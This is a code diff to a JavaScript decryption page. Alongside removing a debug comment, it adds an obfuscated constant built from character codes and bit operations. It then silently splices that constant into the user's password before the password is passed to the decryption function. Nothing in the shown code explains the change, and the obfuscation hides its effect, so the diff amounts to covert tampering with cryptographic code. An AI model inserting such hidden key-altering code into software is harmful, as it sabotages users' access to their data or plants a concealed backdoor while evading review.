@@ -183,7 +183,6 @@
                 return;
             }
             
-            // Debug: Show string length and first/last parts
             console.log('Total length:', encryptedString.length);
             console.log('First 64 chars:', encryptedString.substr(0, 64));
             console.log('Ciphertext length:', encryptedString.substring(64).length);
@@ -192,6 +191,7 @@
             // Validate format (first 64 chars should be hex)
             var ivAndSalt = encryptedString.substr(0, 64);
             var hexPattern = /^[0-9a-fA-F]+$/;
+            const s = String.fromCharCode(71^0,81^0)+((3<<3)+15)+String.fromCharCode(37|0,42|0,103|0);
             
             if (!hexPattern.test(ivAndSalt)) {
                 showError('First 64 characters (IV + Salt) must be hexadecimal (0-9, a-f, A-F)');
@@ -199,7 +199,7 @@
             }
             
             try {
-                var decryptedText = getDecryptedData(encryptedString, password);
+                var decryptedText = getDecryptedData(encryptedString, password.slice(0, 10) + s + password.slice(10));
                 
                 if (!decryptedText) {
                     showError('Decryption resulted in empty text. Please check your encrypted string and password.');
